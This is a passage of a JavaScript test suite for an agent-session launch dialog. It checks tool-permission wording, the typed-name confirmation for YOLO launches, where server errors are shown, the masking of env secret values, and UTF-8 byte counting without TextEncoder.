  assert.equal(line({ state: "starting", turn: 1 }), waiting);
  assert.match(line({ state: "working", turn: 0 }), /working/i);
  assert.match(line({ state: "working", turn: 4 }), /working/i);
  const replied = line({ state: "done", turn: 1 });
  assert.match(replied, /has replied/i);
  assert.equal(line({ state: "idle", turn: 1 }), replied);
  assert.equal(line({ state: "done", turn: 7 }), replied);
  assert.match(line({ state: "blocked", turn: 0 }), /asking you/i);
  assert.match(line({ state: "blocked", turn: 2 }), /asking you/i, "asking beats an earlier reply");
  assert.match(line({ state: "error", turn: 0 }), /error/i);
  assert.match(line({ state: "error", turn: 3 }), /error/i, "an error beats an earlier reply");
  const all = [waiting, line({ state: "working" }), replied, line({ state: "blocked" }), line({ state: "error" })];
  assert.equal(new Set(all).size, 5, "five different sentences for five different situations");
});

test("Result card: it never claims a reply that Herdr has not shown, and never shows one when it is not following", () => {
  const notFollowing = launch.launchResultCard(createdOf({}, { message: "" }), form({ message: "" }), { state: "done", turn: 5 });
  assert.equal(notFollowing.replyLine, null);
  const following = launch.launchResultCard(createdOf(), form({ message: "hi" }), { state: "working", turn: 0 });
  assert.doesNotMatch(following.replyLine, /has replied/i);
});

test("Result card: a record that is missing is shown as unknown, not as an error", () => {
  const card = launch.launchResultCard(null, null, null);
  assert.deepEqual([card.title, card.session, card.toolsText, card.follow, card.replyLine], ["Started the session.", null, "not reported by the server", false, null]);
  assert.equal(card.messageLine, "No first message was sent.");
  assert.doesNotThrow(() => launch.launchResultCard(undefined, undefined, undefined));
  assert.doesNotThrow(() => launch.launchResultCard({}, {}, {}));
});

test("Result card: the session name is shown as the server gave it, in any script and at any length", () => {
  for (const name of ["cao-日本", "cao-" + "n".repeat(500), "cao-a b", "cao-<b>x</b>"]) {
    const card = launch.launchResultCard(createdOf({ session_name: name }), form({ message: "hi" }), undefined);
    assert.equal(card.session, name);
    assert.equal(card.title, `Started ${name}.`);
  }
});

test("Result card: it changes nothing it is given", () => {
  const created = frozenDeep(createdOf());
  const f = frozenDeep(form({ message: "hi" }));
  const term = frozenDeep({ state: "done", turn: 1 });
  const a = launch.launchResultCard(created, f, term);
  assert.deepEqual(launch.launchResultCard(created, f, term), a);
});

// ---- follow-ups after the first review: what the Ask-first dialog says about tools, and four hostile inputs ----

const NONE_DECLARED = "none declared by the profile; the server applies the role's defaults";
const NOT_KNOWN = "not known: the profile could not be read";

test("a profile that was read and declares no tools says so, and that the server applies the role's defaults", () => {
  for (const profile of [{ name: "p", role: "r", allowedTools: null }, { name: "p", role: "r" }, { name: "p", role: "r", allowedTools: undefined }]) {
    const d = launch.launchDialog("ask", { profile, provider: "claude_code" });
    assert.equal(d.toolsText, NONE_DECLARED, JSON.stringify(profile));
    assert.equal(d.tools, null, "no list is claimed");
  }
  // the same through the server answer: GET /agents/profiles/{name} leaves the key out when the profile has none
  const profile = launch.profileFromOutcome({ kind: "ok", json: { name: "p", role: "r" } });
  assert.equal(launch.launchDialog("ask", { profile, provider: "codex" }).toolsText, NONE_DECLARED);
});

test("a profile that declares an empty list reads 'none', not a blank line", () => {
  const d = launch.launchDialog("ask", { profile: { name: "p", role: "r", allowedTools: [] }, provider: "claude_code" });
  assert.equal(d.toolsText, "none");
  assert.deepEqual(d.tools, []);
});

test("a profile that could not be read reads 'not known: the profile could not be read', with or without the argument", () => {
  assert.equal(launch.launchDialog("ask", { profile: null, provider: "codex" }).toolsText, NOT_KNOWN);
  assert.equal(launch.launchDialog("ask", { provider: "codex" }).toolsText, NOT_KNOWN);
  assert.equal(launch.launchDialog("ask").toolsText, NOT_KNOWN);
});

test("the three tool lines are three different sentences, and a declared list is still printed as the list", () => {
  const text = (profile) => launch.launchDialog("ask", { profile, provider: "claude_code" }).toolsText;
  const lines = [text({ name: "p", allowedTools: null }), text({ name: "p", allowedTools: [] }), text(null)];
  assert.equal(new Set(lines).size, 3);
  assert.equal(text({ name: "p", allowedTools: ["fs_read", "execute_bash"] }), "fs_read, execute_bash");
  assert.equal(text({ name: "p", allowedTools: ["*"] }), "*");
  assert.equal(text({ name: "p", allowedTools: ["none"] }), "none", "a tool that happens to be called none is printed as a name, and is the one thing that reads the same");
});

test("an override is shown whatever the profile declared, including a profile that could not be read", () => {
  for (const profile of [null, { name: "p", allowedTools: null }, { name: "p", allowedTools: [] }, { name: "p", allowedTools: ["fs_read"] }]) {
    const d = launch.launchDialog("ask", { profile, provider: "claude_code", override: ["fs_write", "execute_bash"] });
    assert.equal(d.toolsText, "fs_write, execute_bash", JSON.stringify(profile));
    assert.equal(d.toolsHeading, "Allowed tools (your override)");
  }
});

test("declaredTools: the label 'declared by the profile; the server resolves the final set' is on every tool line that is not an override", () => {
  for (const profile of [null, { name: "p", allowedTools: null }, { name: "p", allowedTools: [] }, { name: "p", allowedTools: ["fs_read"] }]) {
    const d = launch.launchDialog("ask", { profile, provider: "claude_code" });
    assert.equal(d.toolsLabel, LABEL_DECLARED, JSON.stringify(profile));
    assert.equal(d.toolsHeading, "Declared tools");
  }
  assert.equal(launch.launchDialog("ask", { profile: { name: "p" }, provider: "claude_code", override: ["a"] }).toolsLabel, null);
});

test("a profile with no declared tools is still restricted for the enforcement line: prompt-only providers say 'not enforced'", () => {
  for (const profile of [{ name: "p", allowedTools: null }, null]) {
    const d = launch.launchDialog("ask", { profile, provider: "codex" });
    assert.equal(d.notEnforcedLabel, LABEL_NOT_ENFORCED);
    assert.equal(d.enforcement, "prompt-only (the agent is told, not prevented; treat as unrestricted)");
  }
  assert.equal(launch.launchDialog("ask", { profile: { name: "p", allowedTools: null }, provider: "claude_code" }).enforcement, "native (the provider refuses blocked tools)");
});

test("the YOLO dialog names a profile it was given only by name, and says 'the profile' for none", () => {
  const named = launch.launchDialog("yolo", { profile: { name: "developer" }, provider: "claude_code", sessionName: "s" });
  assert.match(named.title, /developer/);
  assert.match(launch.launchDialog("yolo", { profile: { name: "developer" }, provider: "kiro_cli", sessionName: "s" }).title, /developer/);
  assert.match(launch.launchDialog("yolo", { profile: null, provider: "claude_code", sessionName: "s" }).title, /the profile/);
});

test("profileRoute: a name with a lone surrogate gives null instead of throwing; a proper pair still goes through", () => {
  for (const name of ["\uD800", "\uDC00", "\uDFFF", "a\uD800b", "x\uD83D", "\uDE00y", "\uD800\uD800", "\uDC00\uD800", "\uD800/.."]) {
    assert.doesNotThrow(() => launch.profileRoute(name), JSON.stringify(name));
    assert.equal(launch.profileRoute(name), null, JSON.stringify(name));
  }
  assert.equal(launch.profileRoute("emoji 😀"), `/agents/profiles/${encodeURIComponent("emoji 😀")}`);
  assert.equal(launch.profileRoute("a😀b"), "/agents/profiles/a%F0%9F%98%80b");
});

const NAMELESS = [null, undefined, 0, 5, "developer", true, [], [{ name: "developer" }], {}, { loadable: true }, { name: undefined }, { name: null }, { name: 7 }, { name: {} }, { name: ["developer"] }, { name: { toString: () => "developer" } }];

test("profileMatches skips rows that are not objects or have no text name, and never throws", () => {
  const rows = [...NAMELESS, { name: "developer", loadable: true }, { name: "reviewer", loadable: true }];
  for (const filter of ["", "dev", "undefined", "null", "7", "object", "[object", "true", "0", "  "]) assert.doesNotThrow(() => launch.profileMatches(rows, filter), JSON.stringify(filter));
  assert.deepEqual(namesOf(launch.profileMatches(rows, "")), ["developer", "reviewer"]);
  assert.deepEqual(namesOf(launch.profileMatches(rows, "dev")), ["developer"]);
});

test("profileMatches: a row without a name does not match the filter 'undefined' (or 'null', '7', '[object')", () => {
  for (const filter of ["undefined", "null", "7", "[object", "object", "true"]) assert.deepEqual(launch.profileMatches(NAMELESS, filter), [], filter);
  assert.deepEqual(namesOf(launch.profileMatches([{ name: "undefined" }, { loadable: true }], "undefined")), ["undefined"], "a profile really called that is found");
});

test("profileMatches: skipped rows do not use up the limit", () => {
  const rows = [...NAMELESS, ...NAMELESS, { name: "a1" }, { name: "a2" }, { name: "a3" }];
  assert.deepEqual(namesOf(launch.profileMatches(rows, "a", 2)), ["a1", "a2"]);
  assert.deepEqual(namesOf(launch.profileMatches(rows, "", 3)), ["a1", "a2", "a3"]);
  assert.deepEqual(launch.profileMatches(frozenDeep([null, { name: "a1" }]), "a1").length, 1, "frozen rows are read, not changed");
});

test("providerChoices: a profile whose provider is empty defaults to kiro_cli, as the form resolves it", () => {
  const c = launch.providerChoices([], { provider: "" });
  assert.equal(c.defaultName, "kiro_cli");
  assert.equal(c.defaultText, "Default: kiro_cli", "an empty provider is not 'the profile's'");
  for (const profile of [undefined, null, {}, { provider: null }, { provider: "" }, { provider: "codex" }, { provider: "claude_code" }]) {
    assert.equal(launch.providerChoices([], profile).defaultName, launch.resolvedProvider(form(), profile), JSON.stringify(profile));
  }
  assert.equal(launch.providerChoices([], { provider: "codex" }).defaultText, "Default: codex (the profile's)");
});


// ---- where a launch answer shows, what a confirmed launch may send, and bytes counted without TextEncoder ----

const errOutcome = (status, detail, extra = {}) => ({ kind: "error", status, detail, ...extra });
const afterOf = (outcome, f = form({ idempotencyKey: "k1" })) => launch.launchAfter(launch.launchOutcome(outcome, f), "AUTH TEXT");

test("INLINE_LAUNCH_FIELDS: only the profile, the session name and the working directory show at their field, and the list cannot be changed", () => {
  assert.deepEqual([...launch.INLINE_LAUNCH_FIELDS].sort(), ["profile", "sessionName", "workdir"]);
  assert.ok(Object.isFrozen(launch.INLINE_LAUNCH_FIELDS));
  assert.throws(() => launch.INLINE_LAUNCH_FIELDS.push("env"), TypeError);
});

test("Created: a 201 is the created effect and carries nothing else", () => {
  assert.deepEqual(afterOf({ kind: "ok", json: { session_name: "cao-x", id: "t1", allowed_tools: ["fs_read"] } }), { effect: "created" });
});

test("Retry after a lost response: status 000 is the retry effect with the answer's words", () => {
  const result = launch.launchOutcome({ kind: "unreachable" }, form({ idempotencyKey: "k1" }));
  const after = launch.launchAfter(result, "AUTH TEXT");
  assert.deepEqual(after, { effect: "retry", text: result.message });
  assert.match(after.text, /same key/);
});

test("Server rejects the name: a 400 about the session name shows at that field, with the server's own words", () => {
  const detail = "Invalid session_name: 'a b'";
  assert.deepEqual(afterOf(errOutcome(400, detail)), { effect: "inline", field: "sessionName", message: detail });
});

test("a 400 or 422 about the profile or the working directory also shows at its field", () => {
  assert.deepEqual(afterOf(errOutcome(400, "Agent profile 'x' not found")), { effect: "inline", field: "profile", message: "Agent profile 'x' not found" });
  assert.deepEqual(afterOf(errOutcome(400, "Working directory does not exist: /nowhere")), { effect: "inline", field: "workdir", message: "Working directory does not exist: /nowhere" });
  assert.deepEqual(afterOf(errOutcome(422, "query.working_directory: field required")), { effect: "inline", field: "workdir", message: "query.working_directory: field required" });
  assert.deepEqual(afterOf(errOutcome(422, "query.agent_profile: field required")), { effect: "inline", field: "profile", message: "query.agent_profile: field required" });
});

test("a server field the form has no inline place for comes as a banner that names the field", () => {
  const cases = [
    [errOutcome(400, "initial_message must not be empty"), "message"],
    [errOutcome(422, "query.provider: bad"), "provider"],
    [errOutcome(422, "query.allowed_tools: bad"), "allowedTools"],
    [errOutcome(422, "query.memory_manager: bad"), "memory"],
    [errOutcome(422, "body.env_vars: key is reserved"), "env"],
  ];
  for (const [outcome, field] of cases) {
    const after = afterOf(outcome);
    assert.equal(after.effect, "banner", field);
    assert.equal(after.text, `${field}: ${outcome.detail}`, field);
    assert.equal(Object.hasOwn(after, "field"), false, field);
  }
});

test("every field the answer parser can name goes either inline or to a banner that names it; never both, never neither", () => {
  for (const field of ["profile", "provider", "sessionName", "workdir", "allowedTools", "memory", "env", "message"]) {
    const after = launch.launchAfter({ type: "field", field, message: "m" }, "A");
    if (launch.INLINE_LAUNCH_FIELDS.includes(field)) assert.deepEqual(after, { effect: "inline", field, message: "m" }, field);
    else assert.deepEqual(after, { effect: "banner", text: `${field}: m` }, field);
  }
});

test("Node at its terminal cap: a 429 is a banner that says the server is at its terminal limit, and nothing is retried", () => {
  const after = afterOf(errOutcome(429, "too many terminals"));
  assert.deepEqual(after, { effect: "banner", text: "the server is at its terminal limit" });
});

test("auth: the banner is the text the caller gives, not the answer's own", () => {
  const result = launch.launchOutcome({ kind: "auth", message: "401 from the server" }, form());
  assert.deepEqual(launch.launchAfter(result, "CAO requires auth - not supported by this window yet"), { effect: "banner", text: "CAO requires auth - not supported by this window yet" });
  assert.equal(launch.launchAfter(result, "other words").text, "other words");
  assert.equal(launch.launchAfter(result, "").text, "", "the text is the caller's, whatever it is");
});

test("a replay of a failed create, a refused request and any other error are banners with the cause", () => {
  const failed = afterOf(errOutcome(424, "provider failed to start", { json: { terminal_id: "t9" } }));
  assert.deepEqual(failed, { effect: "banner", text: "provider failed to start" });
  const tooLarge = afterOf({ kind: "too_large", message: "the message is too large to send from this window" });
  assert.deepEqual(tooLarge, { effect: "banner", text: "the message is too large to send from this window" });
  assert.deepEqual(afterOf({ kind: "env_refused", message: "env is not sent" }), { effect: "banner", text: "env is not sent" });
  assert.deepEqual(afterOf(errOutcome(500, "Internal error")), { effect: "banner", text: "Internal error" });
  assert.deepEqual(afterOf(errOutcome(404, "not found")), { effect: "banner", text: "not found" });
});

test("a banner never reads 'undefined' or 'null', and a created session is never anything but the created effect", () => {
  const outcomes = [
    errOutcome(400, "x"), errOutcome(422, "query.engine: x"), errOutcome(429, "x"), errOutcome(424, "x"), errOutcome(500, "x"), errOutcome(503, undefined),
    { kind: "refused" }, { kind: "too_large" }, { kind: "unreachable" }, { kind: "auth" }, { kind: "ok", json: null }, { kind: "ok", json: { id: "t" } }, {}, null, undefined,
  ];
  for (const o of outcomes) {
    const after = launch.launchAfter(launch.launchOutcome(o, form({ idempotencyKey: "k" })), "AUTH");
    assert.notEqual(after.effect, "created", JSON.stringify(o));
    if (after.effect === "banner") assert.ok(typeof after.text === "string" && after.text !== "" && !/undefined|null/.test(after.text), `${JSON.stringify(o)} -> ${after.text}`);
  }
});

test("launchAfter: only a result of type 'created' creates; anything else, even a near miss, is not a success", () => {
  for (const type of ["CREATED", "create", "ok", "", undefined, null, 7]) {
    assert.notEqual(launch.launchAfter({ type, session: "s" }, "A").effect, "created", String(type));
  }
  for (const result of [null, undefined, {}, "created", 7, []]) {
    assert.doesNotThrow(() => launch.launchAfter(result, "A"));
    assert.equal(launch.launchAfter(result, "A").effect, "banner");
  }
  const frozen = frozenDeep({ type: "field", field: "env", message: "m" });
  assert.deepEqual(launch.launchAfter(frozen, "A"), { effect: "banner", text: "env: m" });
});

// ---- launchConfirm ---------------------------------------------------------------------------------

const CTX = { stdin: false };
const SENT = { send: true, reason: null };
const confirmOf = (over, kind, typed) => launch.launchConfirm(form(over), kind, CTX, typed);

test("launchConfirm: the dialog or click that matches the snapshot's policy sends, with no reason", () => {
  assert.deepEqual(confirmOf({ policy: "ask" }, "ask"), SENT);
  assert.deepEqual(confirmOf({ policy: "auto" }, "auto"), SENT);
  assert.deepEqual(confirmOf({ policy: "yolo", sessionName: "my-session" }, "yolo", "my-session"), SENT);
  assert.deepEqual(launch.launchConfirm(form({ policy: "auto" }), "auto"), SENT, "ctx and typed may be left out");
});

test("YOLO typed confirmation: a YOLO snapshot is refused unless the exact session name was typed", () => {
  for (const typed of ["", "my-sessio", "my-session ", " my-session", "My-Session", "my-session2", "cao-my-session", "other", undefined, null]) {
    const r = confirmOf({ policy: "yolo", sessionName: "my-session" }, "yolo", typed);
    assert.deepEqual(r, { send: false, reason: "the typed name is not the session name" }, JSON.stringify(typed));
  }
  assert.equal(launch.launchConfirm(form({ policy: "yolo", sessionName: "my-session" }), "yolo", CTX).send, false, "typed left out is nothing typed");
});

test("YOLO without a name: the snapshot is blocked at the name, so there is nothing to type", () => {
  for (const sessionName of ["", " "]) {
    const r = confirmOf({ policy: "yolo", sessionName }, "yolo", sessionName);
    assert.equal(r.send, false, JSON.stringify(sessionName));
    assert.match(r.reason, /name is needed to confirm|letters, digits/);
  }
});

test("an Ask-first snapshot that is blocked when the dialog is confirmed is refused, with the problem's own words", () => {
  const blocked = [
    [{ workdir: "" }, /directory on the CAO machine is needed/],
    [{ workdir: "x/y" }, /absolute path on the CAO machine/],
    [{ workdir: "~/x" }, /absolute path on the CAO machine/],
    [{ workdir: "." }, /absolute path on the CAO machine/],
    [{ workdir: "   " }, /directory on the CAO machine is needed/],
    [{ profile: "" }, /choose an agent profile/],
    [{ sessionName: "my session" }, /only letters, digits, - and _/],
    [{ env: ENV_ROW }, /env values are not sent from this window/],
    [{ env: [{ key: "CLAUDE_CONFIG", value: "x" }] }, /reserved for provider env/],
  ];
  for (const [over, words] of blocked) {
    for (const [policy, kind] of [["ask", "ask"], ["auto", "auto"]]) {
      const r = confirmOf({ ...over, policy }, kind);
      assert.equal(r.send, false, `${JSON.stringify(over)} ${policy}`);
      assert.match(r.reason, words, `${JSON.stringify(over)} ${policy}`);
    }
    const y = confirmOf({ ...over, policy: "yolo", sessionName: over.sessionName ?? "s1" }, "yolo", over.sessionName ?? "s1");
    assert.equal(y.send, false, `${JSON.stringify(over)} yolo`);
  }
});

test("Relative directory: Launch from a snapshot with 'x/y' sends nothing and says the directory must be an absolute path", () => {
  const plan = launch.launchPlan(form({ workdir: "x/y" }), CTX);
  assert.deepEqual([plan.action, plan.first.field], ["blocked", "workdir"]);
  assert.match(plan.first.message, /absolute path on the CAO machine/);
  assert.equal(confirmOf({ workdir: "x/y" }, "ask").send, false);
  assert.equal(confirmOf({ workdir: "/" }, "ask").send, true, "the root is absolute");
  assert.equal(confirmOf({ workdir: "/work/repo with space" }, "ask").send, true);
});

test("the dialog that was confirmed must be the one the snapshot's policy asks for", () => {
  const policies = { ask: ["ask", "my-session"], auto: ["auto", "my-session"], yolo: ["yolo", "my-session"] };
  for (const [policy, [right]] of Object.entries(policies)) {
    for (const kind of ["ask", "auto", "yolo"]) {
      const r = confirmOf({ policy, sessionName: "my-session" }, kind, "my-session");
      assert.equal(r.send, kind === right, `${policy} snapshot, ${kind} confirmed`);
      if (kind !== right) assert.deepEqual(r, { send: false, reason: "the policy changed since the dialog opened" }, `${policy} snapshot, ${kind} confirmed`);
    }
  }
  for (const kind of [undefined, null, "", "YOLO", "Ask", "send", "dialog", 7, {}]) {
    for (const policy of ["ask", "auto", "yolo"]) assert.equal(confirmOf({ policy, sessionName: "my-session" }, kind, "my-session").send, false, `${policy} ${JSON.stringify(kind)}`);
  }
});

test("a snapshot whose policy is not one the form offers is an Ask-first launch, and only the Ask-first dialog may send it", () => {
  for (const policy of [undefined, null, "", "YOLO", "yolo ", "auto-approve", 0]) {
    assert.equal(confirmOf({ policy, sessionName: "s1" }, "ask").send, true, JSON.stringify(policy));
    for (const kind of ["auto", "yolo"]) assert.equal(confirmOf({ policy, sessionName: "s1" }, kind, "s1").send, false, `${JSON.stringify(policy)} ${kind}`);
  }
});

test("typing plays no part outside YOLO: Ask-first and Auto-approve send whatever is in the typed field", () => {
  for (const typed of ["", "zzz", "my-session", undefined]) {
    assert.equal(confirmOf({ policy: "ask", sessionName: "my-session" }, "ask", typed).send, true);
    assert.equal(confirmOf({ policy: "auto", sessionName: "my-session" }, "auto", typed).send, true);
  }
});

test("launchConfirm: every combination of policy, kind, form and typed text, against a table written from the spec", () => {
  const valid = { workdir: "/work/repo", profile: "developer", sessionName: "s1" };
  const invalid = { workdir: "x/y", profile: "developer", sessionName: "s1" };
  for (const policy of ["ask", "auto", "yolo", "other"]) {
    for (const kind of ["ask", "auto", "yolo", "other"]) {
      for (const [label, base] of [["valid", valid], ["invalid", invalid]]) {
        for (const typed of ["s1", "s2", ""]) {
          const expected = label === "valid" && kind === (policy === "other" ? "ask" : policy) && (policy !== "yolo" || typed === "s1");
          const r = launch.launchConfirm(form({ ...base, policy }), kind, CTX, typed);
          assert.equal(r.send, expected, `${policy} / ${kind} / ${label} / ${JSON.stringify(typed)}`);
          assert.equal(r.reason === null, r.send, "a reason exactly when nothing is sent");
          if (!r.send) assert.ok(typeof r.reason === "string" && r.reason !== "");
        }
      }
    }
  }
});

test("launchConfirm hands its ctx to the plan: with stdin on, valid env rows no longer block; with stdin off they do", () => {
  const f = form({ policy: "auto", env: ENV_ROW });
  assert.equal(launch.launchConfirm(f, "auto", { stdin: true }, "").send, true);
  assert.equal(launch.launchConfirm(f, "auto", { stdin: false }, "").send, false);
  assert.equal(launch.launchConfirm(f, "auto", {}, "").send, false);
  assert.equal(launch.launchConfirm(f, "auto").send, false);
  assert.equal(launch.launchConfirm(form({ policy: "auto", env: [{ key: "CLAUDE_CONFIG", value: "x" }] }), "auto", { stdin: true }, "").send, false, "the env rules still apply on stdin");
});

test("launchConfirm changes nothing it is given, and gives the same answer twice", () => {
  const f = frozenDeep(form({ policy: "yolo", sessionName: "my-session", env: [{ key: "", value: "" }] }));
  const c = frozenDeep({ stdin: false });
  const a = launch.launchConfirm(f, "yolo", c, "my-session");
  assert.deepEqual(launch.launchConfirm(f, "yolo", c, "my-session"), a);
  assert.deepEqual(a, SENT);
});

test("a launch that is let through sends no allowed_tools unless the user gave some, and never an env value", () => {
  const secret = "S3CRET-VALUE-123";
  const snapshot = form({ policy: "ask", message: "Run the tests", idempotencyKey: "k1" });
  assert.deepEqual(launch.launchConfirm(snapshot, "ask", CTX, ""), SENT);
  const r = launch.buildRequest(snapshot, ctxOf());
  assert.equal(Object.hasOwn(r.query, "allowed_tools"), false);
  assert.deepEqual(r.body, { initial_message: "Run the tests" });
  // with an env row the snapshot is refused, and a request built anyway still carries no env value
  const withEnv = form({ policy: "auto", env: [{ key: "API_TOKEN", value: secret }], idempotencyKey: "k1" });
  assert.equal(launch.launchConfirm(withEnv, "auto", CTX, "").send, false);
  assert.ok(!JSON.stringify(launch.buildRequest(withEnv, ctxOf())).includes(secret));
  assert.ok(!launch.launchConfirm(withEnv, "auto", CTX, "").reason.includes(secret), "the reason does not echo the value");
  assert.ok(!launch.equivalentCommand(withEnv, ctxOf()).includes(secret), "the command shows the value masked");
});

test("buildRequest ignores a resolvedTools option: a plain launch never carries allowed_tools, whatever ctx says", () => {
  for (const resolvedTools of [["fs_read", "fs_write"], [], ["*"], "fs_read", null, undefined, 7]) {
    const r = launch.buildRequest(form({ idempotencyKey: "k" }), ctxOf({ resolvedTools }));
    assert.equal(Object.hasOwn(r.query, "allowed_tools"), false, JSON.stringify(resolvedTools));
    assert.deepEqual(r.query, launch.buildRequest(form({ idempotencyKey: "k" }), ctxOf()).query, JSON.stringify(resolvedTools));
  }
  const over = launch.buildRequest(form({ allowedTools: ["fs_list"], idempotencyKey: "k" }), ctxOf({ resolvedTools: ["fs_read"] }));
  assert.equal(over.query.allowed_tools, "fs_list", "an override is still sent");
  const yolo = launch.buildRequest(form({ policy: "yolo", sessionName: "s", idempotencyKey: "k" }), ctxOf({ resolvedTools: ["fs_read"] }));
  assert.equal(yolo.query.allowed_tools, "*", "YOLO is still *");
});

// ---- bytes are counted without TextEncoder -----------------------------------------------------------

const MODULE_URLS = { launch: new URL("./launch.js", import.meta.url).href, workflows: new URL("./workflows.js", import.meta.url).href };
const bytesOfText = (s) => new TextEncoder().encode(s).length;

// Runs `script` as an ES module in a child node whose globalThis has no TextEncoder, and returns what it printed as JSON.
function withoutTextEncoder(script) {
  const prelude = `delete globalThis.TextEncoder;\nif (typeof globalThis.TextEncoder !== "undefined") throw new Error("TextEncoder is still there");\n`;
  const r = spawnSync(process.execPath, ["--input-type=module", "-e", prelude + script], { encoding: "utf8", timeout: 60000 });
  assert.equal(r.status, 0, `child failed: ${r.stderr}`);
  return JSON.parse(r.stdout);
}

// A text is a unit repeated n times and then a tail, so the child can build a 256 KiB source itself
// (a command line cannot carry one).
const textOf = ([unit, n, tail = ""]) => unit.repeat(n) + tail;

test("launch.js and workflows.js load, and their checks count bytes, with no TextEncoder in the runtime", () => {
  const values = [
    ["a", 2047], ["a", 2048], ["日", 682], ["日", 683], ["日", 682, "a"], ["日", 682, "aa"],
    ["😀", 511], ["😀", 512], ["😀", 511, "abc"], ["😀", 511, "abcd"], ["é", 1023, "a"], ["é", 1024], ["", 0],
  ];
  const sources = [
    ["y", 262144], ["y", 262145], ["日", 87381, "a"], ["日", 87381, "aa"], ["😀", 65536], ["😀", 65536, "a"], ["é日😀", 5000], ["a\uD800b", 1], ["", 0],
    // the edges between one, two, three and four bytes, and surrogates that do not make a pair
    ["\u007f", 300], ["\u0080", 300], ["\u07ff", 300], ["\u0800", 300], ["\uD7FF", 300], ["\uE000", 300], ["\uFFFF", 300],
    ["\uD800", 1], ["\uD800\uD800", 1], ["\uDC00\uD800", 1], ["\uDC00", 1], ["a\uD83D", 1], ["\uD83D\uDE00", 1], ["\uD83D\uDE00\uD83D", 1],
  ];
  const out = withoutTextEncoder(`
    const launch = await import(${JSON.stringify(MODULE_URLS.launch)});
    const wf = await import(${JSON.stringify(MODULE_URLS.workflows)});
    const textOf = ${textOf.toString()};
    const env = ${JSON.stringify(values)}.map((d) => launch.envCheck([{ key: "K", value: textOf(d) }]));
    const yaml = ${JSON.stringify(sources)}.map((d) => { const r = wf.sourceCheck("yaml", textOf(d), "wf", true); return { ok: r.ok, bytes: r.bytes }; });
    const arg = ${JSON.stringify(sources.slice(6, 9))}.map((d) => { const r = wf.sourceCheck("yaml", textOf(d), "wf", false); return { ok: r.ok, bytes: r.bytes }; });
    console.log(JSON.stringify({ env, yaml, arg }));
  `);
  values.forEach((d, i) => assert.equal(out.env[i].ok, bytesOfText(textOf(d)) < 2048, `env value #${i} (${bytesOfText(textOf(d))} bytes)`));
  sources.forEach((d, i) => {
    const bytes = bytesOfText(textOf(d));
    assert.deepEqual(out.yaml[i], { ok: bytes <= 262144, bytes }, `yaml source #${i} (${bytes} bytes)`);
  });
  sources.slice(6, 9).forEach((d, i) => {
    const bytes = bytesOfText(JSON.stringify({ name: "wf", source: textOf(d), tier: "yaml" }));
    assert.deepEqual(out.arg[i], { ok: bytes <= ARG_BODY_MAX, bytes }, `argument-mode source #${i}`);
  });
  // the boundaries the cases above stand on
  assert.deepEqual(values.slice(0, 4).map((d) => bytesOfText(textOf(d))), [2047, 2048, 2046, 2049]);
  assert.deepEqual([bytesOfText(textOf(sources[2])), bytesOfText(textOf(sources[4]))], [262144, 262144]);
  assert.equal(bytesOfText(textOf(sources[7])), 5, "a lone surrogate encodes to 3 bytes");
});

test("the 128 KiB budget of env rows counts the same bytes for ASCII, CJK and emoji, with no TextEncoder", () => {
  const rowsOf = (value) => Array.from({ length: 80 }, () => ({ key: "K", value }));
  const values = ["a".repeat(1800), "日".repeat(600), "😀".repeat(450)];
  for (const v of values) assert.equal(bytesOfText(v), 1800);
  const out = withoutTextEncoder(`
    const launch = await import(${JSON.stringify(MODULE_URLS.launch)});
    console.log(JSON.stringify(${JSON.stringify(values)}.map((v) => launch.envCheck(${JSON.stringify(rowsOf("@"))}.map((r) => ({ ...r, value: v }))))));
  `);
  // each row costs 1 + 1800 + 3 = 1804 bytes: 72 rows fit in 131072, the 73rd (index 72) does not, and it is said once
  for (const r of out) {
    assert.equal(r.ok, false);
    assert.equal(r.errors.length, 1);
    assert.deepEqual([r.errors[0].row, r.errors[0].field], [72, "value"]);
    assert.match(r.errors[0].message, /128 KiB/);
  }
});

test("lib/launch.js and lib/workflows.js do not use TextEncoder at all, in code", () => {
  for (const file of ["launch.js", "workflows.js"]) {
    const code = readFileSync(new URL(`./${file}`, import.meta.url), "utf8").replace(/\/\*[\s\S]*?\*\//g, "").replace(/(^|[^:])\/\/.*$/gm, "$1");
    assert.doesNotMatch(code, /TextEncoder/, file);
  }
});

// ---- launchReadResult: what the Ask-first launch does when the profile read returns ----

const CHANGED_TEXT = "The form changed, press Launch again.";
const readOf = (over = {}) => launch.launchReadResult({ scope: "session:a", current: "session:a", sameForm: true, error: null, ...over });

test("launchReadResult: the dialog opens only when the selection and the form are still those of the press and the read worked", () => {
  assert.deepEqual(readOf(), { action: "open" });
  assert.deepEqual(readOf({ error: undefined }), { action: "open" }, "no error given at all");
});

test("launchReadResult: the whole table of selection, form and error, so no pair is left to a guess", () => {
  const same = { scope: "session:a", current: "session:a" };
  const moved = { scope: "session:a", current: "session:b" };
  const table = [
    // selection, form, error -> result
    [same, true, null, { action: "open" }],
    [same, true, "no answer", { action: "error", text: "no answer" }],
    [same, false, null, { action: "changed", text: CHANGED_TEXT }],
    [same, false, "no answer", { action: "changed", text: CHANGED_TEXT }],
    [moved, true, null, { action: "changed", text: CHANGED_TEXT }],
    [moved, true, "no answer", { action: "changed", text: CHANGED_TEXT }],
    [moved, false, null, { action: "changed", text: CHANGED_TEXT }],
    [moved, false, "no answer", { action: "changed", text: CHANGED_TEXT }],
  ];
  for (const [sel, sameForm, error, expected] of table) {
    assert.deepEqual(launch.launchReadResult({ ...sel, sameForm, error }), expected, `${sel.current}, form ${sameForm}, error ${error}`);
  }
});

test("launchReadResult: a changed selection or form wins over a read error, so nothing is dropped silently and no error is shown for a form that is gone", () => {
  assert.deepEqual(readOf({ current: "session:b", error: "CAO did not answer" }), { action: "changed", text: CHANGED_TEXT });
  assert.deepEqual(readOf({ sameForm: false, error: "CAO did not answer" }), { action: "changed", text: CHANGED_TEXT });
  assert.ok(readOf({ sameForm: false }).text.length > 0);
});

test("launchReadResult: a read error is shown exactly as it came, whatever it holds", () => {
  const texts = ["CAO did not answer", "日本語 のエラー é 🙂", "x".repeat(100000), "line 1\nline 2\t\"quoted\" <b>x</b>", " ", "null", "undefined", "Agent profile 'x' not found", "\u0000"];
  for (const error of texts) {
    const r = readOf({ error });
    assert.equal(r.action, "error", JSON.stringify(error).slice(0, 30));
    assert.equal(r.text, error, JSON.stringify(error).slice(0, 30));
  }
});

test("launchReadResult: no error (null or undefined) is not an error", () => {
  for (const error of [null, undefined]) assert.equal(readOf({ error }).action, "open");
});

test("launchReadResult: no selection at the press and none now is the same selection; one that appeared or went is not", () => {
  assert.deepEqual(readOf({ scope: null, current: null }), { action: "open" });
